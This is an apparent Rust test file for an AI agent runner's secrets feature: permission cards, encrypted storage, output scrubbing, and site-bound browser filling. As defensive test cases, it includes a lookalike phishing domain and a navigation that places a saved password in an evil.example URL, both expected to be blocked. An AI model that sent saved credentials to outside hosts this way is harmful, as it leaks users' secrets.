use super::*;
use crate::plugins::Manifest;
use lorca_agent::tools::SecretVariables;
use std::time::Duration;

/// An App over a scratch home, removed when the test ends.
struct ScratchApp(Arc<App>, std::path::PathBuf);
impl Drop for ScratchApp {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.1);
    }
}

/// A Runner with an identity, its first bot, and that bot's DM.
fn runner() -> (ScratchApp, Bot, String) {
    let home = std::env::temp_dir().join(format!("lorca-secrets-{}", uuid::Uuid::new_v4()));
    let app = App::load(crate::config::Config { home: home.clone(), port: 0 }).unwrap();
    crate::identity::create(&app, Some("Workbench".into())).unwrap();
    let bot = app.state.lock().unwrap().bots[0].clone();
    let chat_id = app.dm_with(&bot.id, None).unwrap().meta.id;
    (ScratchApp(app, home), bot, chat_id)
}

fn install(app: &Arc<App>, manifest: Value) {
    crate::plugins::install(app, Manifest::parse(&manifest).unwrap(), "marketplace").unwrap();
}

fn browser(app: &Arc<App>) {
    install(app, json!({ "id": "playwright", "name": "Browser", "servers": { "browser": { "type": "stdio", "command": "true" } } }));
}

fn tool(app: &Arc<App>, bot: &Bot, chat_id: &str) -> RequestSecret {
    RequestSecret { app: app.clone(), chat_id: chat_id.into(), bot: bot.clone(), unattended: false }
}

/// Runs `args` through `request_secret` and answers its card through the app's own
/// `chats.permission`, as any Device's answer arrives; returns the call's outcome and the card.
async fn ask_and_answer(app: &Arc<App>, bot: &Bot, chat_id: &str, args: Value, answer: Value) -> (Result<ToolResult, ToolError>, Message) {
    let call = tool(app, bot, chat_id);
    let running = tokio::spawn(async move { call.execute("call", args, CancellationToken::new(), Arc::new(|_| {})).await });
    let card = loop {
        let waiting = app.pending_permissions.lock().unwrap().keys().next().cloned();
        if let Some(id) = waiting {
            break app.message(chat_id, &id).unwrap();
        }
        tokio::time::sleep(Duration::from_millis(5)).await;
    };
    let mut params = answer;
    params["chat_id"] = json!(chat_id);
    params["message_id"] = json!(card.id);
    let answered = crate::api::dispatch(app, "chats.permission", params).await;
    let outcome = running.await.unwrap();
    if let Err(error) = answered {
        assert!(outcome.is_err(), "the call goes on only after an answer: {error}");
    }
    (outcome, app.message(chat_id, &card.id).unwrap())
}

#[test]
fn names_sites_and_pages() {
    assert_eq!(placeholders("{{secret:user}}\t{{secret: pass }}{{secret:open"), vec!["user", "pass"]);
    assert!(valid_name("GITHUB_TOKEN") && valid_name("_x1") && !valid_name("1x") && !valid_name("a-b") && !valid_name(""));
    assert_eq!(site_of("https://www.GitHub.com/login?x=1").as_deref(), Some("github.com"));
    assert_eq!(site_of("app.example.com").as_deref(), Some("app.example.com"));
    assert_eq!(site_of(" ").as_deref(), None);
    assert!(page_is_on("github.com", "https://github.com/login"));
    assert!(page_is_on("github.com", "https://auth.github.com/session"));
    assert!(!page_is_on("github.com", "http://github.com/login"), "never over plain http");
    assert!(!page_is_on("github.com", "https://github.com.evil.example/login"));
    assert!(!page_is_on("github.com", "https://notgithub.com/"));
    assert!(page_is_on("localhost", "http://localhost:8080/login"), "this computer, for a local service");
    let tabs = "### Open tabs\n- 0: [Docs](https://docs.github.com/)\n- 1: (current) [Sign in to GitHub · GitHub](https://github.com/login?return_to=%2F)\n";
    assert_eq!(current_page(tabs).as_deref(), Some("https://github.com/login?return_to=%2F"));
    assert_eq!(current_page("- 0: (current) [a](b)](https://x.test/) [crashed]").as_deref(), Some("https://x.test/"));
    assert_eq!(current_page("No open tabs."), None);
}

#[test]
fn every_spelling_of_a_value_is_scrubbed() {
    let (scratch, bot, _) = runner();
    let app = &scratch.0;
    let ask = SecretAsk { target: COMMAND.into(), site: None, fields: vec![SecretField { name: "TOKEN".into(), label: "Token".into() }] };
    keep(app, &bot.id, &ask, &BTreeMap::from([("TOKEN".to_string(), "p@ss 'w\"rd".to_string())])).unwrap();
    let redactions = Redactions::load(app);
    assert_eq!(redactions.text("value: p@ss 'w\"rd!").as_deref(), Some("value: {{secret:TOKEN}}!"));
    assert_eq!(redactions.text(r#"{"text":"p@ss 'w\"rd"}"#).as_deref(), Some(r#"{"text":"{{secret:TOKEN}}"}"#), "inside JSON");
    assert_eq!(redactions.text(r#"fill('p@ss \'w"rd')"#).as_deref(), Some("fill('{{secret:TOKEN}}')"), "in Playwright's code");
    assert_eq!(redactions.text("?q=p%40ss%20%27w%22rd").as_deref(), Some("?q={{secret:TOKEN}}"), "in a URL");
    assert_eq!(redactions.text("nothing here"), None);

    let result = ToolResult {
        content: vec![ContentPart::text("echo p@ss 'w\"rd"), ContentPart::Image { data: "AAAA".into(), mime_type: "image/png".into() }],
        details: json!({ "output": "p@ss 'w\"rd" }),
        structured: Some(json!({ "output": ["p@ss 'w\"rd"] })),
        ..ToolResult::default()
    };
    let clean = scrub_result(app, &result).unwrap();
    assert_eq!(clean.content.as_ref().unwrap()[0].as_text(), Some("echo {{secret:TOKEN}}"));
    assert!(matches!(clean.content.as_ref().unwrap()[1], ContentPart::Image { .. }));
    assert_eq!(clean.details.unwrap()["output"], "{{secret:TOKEN}}");
    assert_eq!(clean.structured.unwrap()["output"][0], "{{secret:TOKEN}}");
    assert!(scrub_result(app, &ToolResult::text("clean")).is_none());
}

#[test]
fn a_runners_secrets_are_kept_encrypted_and_listed_without_values() {
    let (scratch, bot, _) = runner();
    let app = &scratch.0;
    let ask = SecretAsk { target: BROWSER.into(), site: Some("github.com".into()), fields: vec![SecretField { name: "password".into(), label: "GitHub password".into() }] };
    keep(app, &bot.id, &ask, &BTreeMap::from([("password".to_string(), "hunter2-long".to_string())])).unwrap();
    let file = std::fs::read(scratch.1.join(FILE)).unwrap();
    assert!(!String::from_utf8_lossy(&file).contains("hunter2"), "the file is ciphertext");

    // Read back by a fresh load, as after a restart.
    app.secrets.reset();
    let listed = list(app).unwrap();
    assert_eq!(listed.len(), 1);
    assert_eq!((listed[0].label.as_str(), listed[0].site.as_deref(), listed[0].target.as_str()), ("GitHub password", Some("github.com"), BROWSER));
    assert!(!serde_json::to_string(&listed).unwrap().contains("hunter2"), "a listing carries no value");

    // Asking again for the same name replaces it; replacing keeps its id.
    keep(app, &bot.id, &ask, &BTreeMap::from([("password".to_string(), "second-value".to_string())])).unwrap();
    assert_eq!(list(app).unwrap().len(), 1);
    let replaced = replace(app, &listed[0].id, "  third-value\n").unwrap();
    assert_eq!(replaced.id, listed[0].id);
    assert!(loaded(app).unwrap()[0].value == "third-value", "trimmed");
    assert_eq!(replace(app, &listed[0].id, "abc").unwrap_err(), "GitHub password is too short to keep as a secret.");

    forget_bots(app, &["someone-else".to_string()]);
    assert_eq!(list(app).unwrap().len(), 1);
    delete(app, &listed[0].id).unwrap();
    assert!(list(app).unwrap().is_empty());
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_card_asks_and_the_answer_reaches_only_the_runner() {
    let (scratch, bot, chat_id) = runner();
    let app = &scratch.0;
    let args = json!({ "use": "command", "why": "To open the pull request.", "secrets": [{ "name": "GITHUB_TOKEN", "label": "GitHub token" }] });
    let (outcome, card) = ask_and_answer(app, &bot, &chat_id, args, json!({ "decision": "allow", "values": { "GITHUB_TOKEN": "ghp_0123456789" } })).await;
    let text = outcome.unwrap().text_content();
    assert!(text.starts_with("The user saved GITHUB_TOKEN.") && !text.contains("ghp_"), "{text}");
    let Body::Permission { tool, decision, summary, reason, secret: Some(ask), .. } = &card.body else { panic!() };
    assert_eq!((tool.as_str(), decision.as_str(), summary.as_str(), reason.as_deref()), ("secret", "allowed", "GitHub token", Some("To open the pull request.")));
    assert_eq!((ask.target.as_str(), ask.fields[0].name.as_str()), (COMMAND, "GITHUB_TOKEN"));
    assert!(!serde_json::to_string(&card).unwrap().contains("ghp_"), "the card never holds the value");

    // Its commands get it by name, and only the bot that asked.
    let variables = CommandSecrets { app: app.clone(), bot_id: bot.id.clone() }.variables(&["GITHUB_TOKEN".into()]).unwrap();
    assert_eq!(variables, vec![(OsString::from("GITHUB_TOKEN"), OsString::from("ghp_0123456789"))]);
    assert!(CommandSecrets { app: app.clone(), bot_id: "bot-other".into() }.variables(&["GITHUB_TOKEN".into()]).is_err());
    assert!(prompt(app, &bot.id).contains("GITHUB_TOKEN (commands)"));

    // Not now: nothing is kept, and the bot hears it.
    let args = json!({ "use": "command", "why": "Deploy.", "secrets": [{ "name": "DEPLOY_KEY", "label": "Deploy key" }] });
    let (outcome, card) = ask_and_answer(app, &bot, &chat_id, args, json!({ "decision": "deny" })).await;
    assert!(outcome.unwrap_err().0.contains("did not give Deploy key"));
    assert!(matches!(&card.body, Body::Permission { decision, .. } if decision == "denied"));
    assert_eq!(list(app).unwrap().len(), 1);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn an_empty_answer_keeps_the_card_waiting() {
    let (scratch, bot, chat_id) = runner();
    let app = &scratch.0;
    let call = tool(app, &bot, &chat_id);
    let args = json!({ "use": "command", "why": "Deploy.", "secrets": [{ "name": "DEPLOY_KEY", "label": "Deploy key" }] });
    let running = tokio::spawn(async move { call.execute("call", args, CancellationToken::new(), Arc::new(|_| {})).await });
    let id = loop {
        if let Some(id) = app.pending_permissions.lock().unwrap().keys().next().cloned() {
            break id;
        }
        tokio::time::sleep(Duration::from_millis(5)).await;
    };
    let empty = crate::api::dispatch(app, "chats.permission", json!({ "chat_id": chat_id, "message_id": id, "decision": "allow", "values": { "DEPLOY_KEY": " " } })).await;
    assert_eq!(empty.unwrap_err(), "Enter Deploy key.");
    assert!(app.pending_permissions.lock().unwrap().contains_key(&id), "still waiting");
    crate::plugins::mcp::dismiss_questions(app, &chat_id);
    assert!(running.await.unwrap().unwrap().terminate, "a new message dismisses it like any question");
    assert!(matches!(&app.message(&chat_id, &id).unwrap().body, Body::Permission { decision, .. } if decision == "dismissed"));
    let late = crate::api::dispatch(app, "chats.permission", json!({ "chat_id": chat_id, "message_id": id, "decision": "allow", "values": { "DEPLOY_KEY": "late-value" } })).await;
    assert_eq!(late.unwrap_err(), "This request is no longer waiting for an answer.");
    assert!(list(app).unwrap().is_empty(), "nothing is kept for a card nobody waits on");
}

/// Stop ends a card's wait: it reads Dismissed, the bot hears it was stopped rather than refused,
/// and an answer after it keeps nothing.
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn stop_ends_the_wait_and_keeps_nothing() {
    let (scratch, bot, chat_id) = runner();
    let app = &scratch.0;
    let call = tool(app, &bot, &chat_id);
    let cancel = CancellationToken::new();
    let stop = cancel.clone();
    let args = json!({ "use": "command", "why": "Deploy.", "secrets": [{ "name": "DEPLOY_KEY", "label": "Deploy key" }] });
    let running = tokio::spawn(async move { call.execute("call", args, stop, Arc::new(|_| {})).await });
    let id = loop {
        if let Some(id) = app.pending_permissions.lock().unwrap().keys().next().cloned() {
            break id;
        }
        tokio::time::sleep(Duration::from_millis(5)).await;
    };
    cancel.cancel();
    let error = running.await.unwrap().unwrap_err();
    assert_eq!(error.0, "Stopped before the user answered, so Deploy key was not saved.");
    assert!(matches!(&app.message(&chat_id, &id).unwrap().body, Body::Permission { decision, .. } if decision == "dismissed"));
    let late = crate::api::dispatch(app, "chats.permission", json!({ "chat_id": chat_id, "message_id": id, "decision": "allow", "values": { "DEPLOY_KEY": "late-value" } })).await;
    assert_eq!(late.unwrap_err(), "This request is no longer waiting for an answer.");
    assert!(list(app).unwrap().is_empty());
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_plugin_setting_goes_to_the_plugins_own_secrets() {
    let (scratch, bot, chat_id) = runner();
    let app = &scratch.0;
    install(app, json!({
        "id": "acme", "name": "Acme",
        "servers": { "api": { "type": "http", "url": "https://acme.test/mcp", "headers": { "Authorization": "Bearer ${ACME_TOKEN}" } } },
        "variables": [{ "name": "ACME_TOKEN", "secret": true, "required": true }]
    }));
    let wrong = tool(app, &bot, &chat_id).request(&json!({ "use": "plugin", "plugin": "Acme", "why": "x", "secrets": [{ "name": "OTHER", "label": "Other" }] }));
    assert_eq!(wrong.err().unwrap(), "Acme has no setting OTHER; its settings are ACME_TOKEN.");
    let args = json!({ "use": "plugin", "plugin": "acme", "why": "To read your projects.", "secrets": [{ "name": "ACME_TOKEN", "label": "Acme API key" }] });
    let (outcome, card) = ask_and_answer(app, &bot, &chat_id, args, json!({ "decision": "allow", "values": { "ACME_TOKEN": "acme-key-123" } })).await;
    assert!(outcome.unwrap().text_content().contains("Acme has them now"));
    assert!(matches!(&card.body, Body::Permission { plugin_id, plugin_name, .. } if plugin_id == "acme" && plugin_name == "Acme"));
    assert_eq!(app.plugins.lock().unwrap().secret("acme", "ACME_TOKEN"), Some(json!("acme-key-123")));
    assert!(list(app).unwrap().is_empty(), "kept with the plugin, not twice");
}

#[tokio::test]
async fn requests_say_where_a_secret_goes_and_check_access() {
    let (scratch, bot, chat_id) = runner();
    let app = &scratch.0;
    let request = |args: Value| tool(app, &bot, &chat_id).request(&args).err().unwrap_or_default();
    let field = json!([{ "name": "password", "label": "Password" }]);
    assert_eq!(request(json!({ "use": "browser", "why": "x", "site": "github.com", "secrets": field })), "Browser is not installed on your Runner.");
    browser(app);
    assert_eq!(request(json!({ "use": "browser", "why": "x", "secrets": field })), "site is required for browser: the site whose sign-in page gets it");
    let ok = tool(app, &bot, &chat_id).request(&json!({ "use": "browser", "why": "To sign in.", "site": "https://www.github.com/login", "secrets": field })).unwrap();
    assert_eq!((ok.ask.site.as_deref(), ok.plugin_name.as_str()), (Some("github.com"), "Browser"));
    assert_eq!(request(json!({ "use": "command", "why": "x", "secrets": [{ "name": "PATH", "label": "Path" }] })), "PATH is a variable the shell runs by; name the secret something else.");
    assert_eq!(request(json!({ "use": "command", "why": "x", "secrets": [{ "name": "A", "label": "A" }, { "name": "A", "label": "B" }] })), "Each secret needs a name of its own.");
    assert_eq!(request(json!({ "use": "command", "why": " ", "secrets": field })), "why is required: say why you need it");
    let mut shell_off = bot.clone();
    shell_off.permissions = Some(serde_json::from_value(json!({ "shell": false })).unwrap());
    app.state.lock().unwrap().bots[0] = shell_off;
    assert!(request(json!({ "use": "command", "why": "x", "secrets": field })).contains("shell commands are off for this bot"));

    let unattended = RequestSecret { unattended: true, ..tool(app, &bot, &chat_id) };
    let refused = unattended.execute("c", json!({ "use": "command", "why": "x", "secrets": field }), CancellationToken::new(), Arc::new(|_| {})).await.unwrap_err();
    assert!(refused.0.starts_with("Nobody is here to answer"));
}

#[tokio::test]
async fn browser_fills_a_secret_only_on_its_site() {
    let (scratch, bot, _) = runner();
    let app = &scratch.0;
    let ask = SecretAsk { target: BROWSER.into(), site: Some("github.com".into()), fields: vec![SecretField { name: "password".into(), label: "Password".into() }] };
    keep(app, &bot.id, &ask, &BTreeMap::from([("password".to_string(), "hunter2-long".to_string())])).unwrap();
    let page = |url: &'static str| async move { Ok::<String, String>(url.to_string()) };
    let typed = json!({ "element": "Password", "ref": "e7", "text": "{{secret:password}}", "submit": true });

    let filled = fill_call(app, Some(&bot), "playwright", "browser_type", typed.clone(), page("https://github.com/login")).await.unwrap();
    assert_eq!(filled["text"], "hunter2-long");
    assert_eq!(filled["element"], "Password");
    let form = json!({ "fields": [{ "name": "Username", "type": "textbox", "ref": "e3", "value": "ana" }, { "name": "Password", "type": "textbox", "ref": "e7", "value": "{{secret:password}}" }] });
    let filled = fill_call(app, Some(&bot), "playwright", "browser_fill_form", form, page("https://github.com/session")).await.unwrap();
    assert_eq!((filled["fields"][0]["value"].as_str(), filled["fields"][1]["value"].as_str()), (Some("ana"), Some("hunter2-long")));

    let elsewhere = fill_call(app, Some(&bot), "playwright", "browser_type", typed.clone(), page("https://github.com.evil.example/login")).await.unwrap_err();
    assert!(elsewhere.starts_with("password is saved for github.com, and the page open now is"), "{elsewhere}");
    assert!(fill_call(app, Some(&bot), "playwright", "browser_type", typed.clone(), page("http://github.com/login")).await.is_err(), "not over http");
    let navigate = json!({ "url": "https://evil.example/?p={{secret:password}}" });
    assert!(fill_call(app, Some(&bot), "playwright", "browser_navigate", navigate, page("https://github.com/")).await.unwrap_err().starts_with("Saved secrets go only into what Browser types"));
    let into_element = json!({ "element": "{{secret:password}}", "ref": "e7", "text": "x" });
    assert!(fill_call(app, Some(&bot), "playwright", "browser_type", into_element, page("https://github.com/")).await.is_err());
    let other_plugin = json!({ "body": "{{secret:password}}" });
    assert!(fill_call(app, Some(&bot), "github", "create_issue", other_plugin, page("https://github.com/")).await.is_err());
    let someone_else = Bot { id: "bot-other".into(), ..bot.clone() };
    assert!(fill_call(app, Some(&someone_else), "playwright", "browser_type", typed.clone(), page("https://github.com/")).await.unwrap_err().starts_with("No secret password"));
    // A call that names none goes as it is, without asking the browser where it is.
    let plain = json!({ "element": "Search", "ref": "e1", "text": "lorca" });
    let unasked = async { Err::<String, String>("never asked".into()) };
    assert_eq!(fill_call(app, Some(&bot), "playwright", "browser_type", plain.clone(), unasked).await.unwrap(), plain);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn the_apps_list_replace_and_delete_a_runners_secrets() {
    let (scratch, bot, _) = runner();
    let app = &scratch.0;
    let ask = SecretAsk { target: COMMAND.into(), site: None, fields: vec![SecretField { name: "NPM_TOKEN".into(), label: "npm token".into() }] };
    keep(app, &bot.id, &ask, &BTreeMap::from([("NPM_TOKEN".to_string(), "npm_first".to_string())])).unwrap();
    let runner_id = app.this_device_id().unwrap();
    let listed = crate::api::dispatch(app, "secrets.list", json!({ "runner_id": runner_id })).await.unwrap();
    let id = listed["secrets"][0]["id"].as_str().unwrap().to_string();
    assert_eq!((listed["secrets"][0]["use"].as_str(), listed["secrets"][0]["bot_id"].as_str()), (Some(COMMAND), Some(bot.id.as_str())));
    assert!(listed["secrets"][0].get("value").is_none());
    let set = crate::api::dispatch(app, "secrets.set", json!({ "runner_id": runner_id, "id": id, "value": "npm_second" })).await.unwrap();
    assert_eq!(set["secret"]["id"], id.as_str());
    assert_eq!(CommandSecrets { app: app.clone(), bot_id: bot.id.clone() }.variables(&["NPM_TOKEN".into()]).unwrap()[0].1, OsString::from("npm_second"));
    crate::api::dispatch(app, "secrets.delete", json!({ "runner_id": runner_id, "id": id })).await.unwrap();
    assert!(crate::api::dispatch(app, "secrets.list", json!({ "runner_id": runner_id })).await.unwrap()["secrets"].as_array().unwrap().is_empty());
}
